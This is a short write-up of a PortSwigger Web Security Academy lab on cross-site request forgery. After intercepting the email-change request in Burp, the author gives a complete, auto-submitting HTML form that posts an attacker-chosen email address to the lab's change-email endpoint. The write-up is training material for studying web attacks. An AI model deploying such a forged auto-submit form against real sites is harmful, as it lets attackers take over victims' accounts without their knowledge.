# Lab Writeup: CSRF vulnerability with no defenses

URL: https://portswigger.net/web-security/learning-paths/csrf/csrf-how-to-construct-a-csrf-attack/csrf/lab-no-defenses

## Description

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

1.  Login using `wiener:peter`
2.  Try changing the email address then intercept using burp:

    ![csrf-no-defense](/assets/csrf-no-defense.png)

    From the above intercepted request, we know that the `POST` request is to the path `/my-account/change-email` with data `email=<user_input>`

3.  Go to exploit server then create the CSRF payload, here's the payload:

    ```html
    <!DOCTYPE html>
    <html>
      <body>
        <form
          action="https://0aad00f40374833381b1201400a20071.web-security-academy.net/my-account/change-email"
          method="POST"
        >
          <!-- the only input value -->
          <input type="text" name="email" value="hacker@gmail.com" />
        </form>
        <script type="text/javascript">
          // automatically upload form on open
          document.forms[0].submit();
        </script>
      </body>
    </html>
    ```

4.  Store, deliver exploit to victim, then the lab should be solved:

    ![csrf-no-defense-1](/assets/csrf-no-defense-1.png)
